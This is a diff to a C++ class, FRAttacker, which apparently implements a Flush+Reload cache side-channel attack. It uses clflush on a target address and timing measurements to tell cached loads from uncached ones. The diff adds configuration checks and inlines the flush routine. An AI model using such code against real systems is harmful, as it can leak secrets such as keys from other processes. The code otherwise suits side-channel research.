@@ -1,18 +1,12 @@
-//
-// Created by User on 18/5/2019.
-//
-
 #include "FRAttacker.h"
 #include <unistd.h>
 #include <time.h>
-
-//#include <iostream>
+#include <stdexcept>
 
 using namespace std;
 
-
-FRAttacker::FRAttacker(string path) :
-    Attacker(path) {}
+FRAttacker::FRAttacker() :
+    Attacker() {}
 
 FRAttacker::FRAttacker(string path, char* target, int len) :
     Attacker(path, target, len) {}
@@ -23,7 +17,7 @@ FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime) :
 FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime, int iteration) :
     Attacker(path, target, len, intervalTime, iteration) {}
 
-void FRAttacker::Flush(void* toFlush){
+__attribute__((always_inline)) void FRAttacker::Flush(void* toFlush){
     __asm__ __volatile__ ("clflush (%0)" :: "r"(toFlush));
 }
 
@@ -36,6 +30,14 @@ void FRAttacker::Attack() {
     measurements = Measurements();
     measurements.SetInCacheTime(inCacheTime);
     measurements.SetNoCacheTime(noCacheTime);
+
+    // check dependencies
+    if (inCacheTime == 0 || noCacheTime == 0)
+        throw logic_error("inCacheTime or noCacheTime not set. please set them manually or run Configure()");
+    if (interval == 0)
+        throw logic_error("interval not set. please set manually");
+    if (targetPointer == nullptr)
+        throw logic_error("target not set. please set manually");
 
     // flush for the first time
     if (maxIterations > 0)
@@ -55,17 +57,22 @@ void FRAttacker::Configure() {
     int i;
     unsigned int cyclesSum = 0;
     int numOfIterations = 1000;
+
+    if (targetPointer == nullptr) {
+        throw logic_error("target not defined");
+    }
+
+    //find noCacheTime
     for (i = 0; i < numOfIterations; i++) {
         Flush(targetPointer);
         cyclesSum += MeasureTime(targetPointer);
     }
     SetNoCacheTime(cyclesSum / numOfIterations);
+    // find inCacheTime
     cyclesSum = 0;
     MeasureTime(targetPointer); /* makes sure target pointer has been recently read */
     for (i = 0; i < numOfIterations; i++){
         cyclesSum += MeasureTime(targetPointer);
     }
     SetInCacheTime(cyclesSum / numOfIterations);
-    //cout << "in time: " << inCacheTime << endl;
-    //cout << "no time: " << noCacheTime << endl;
 }
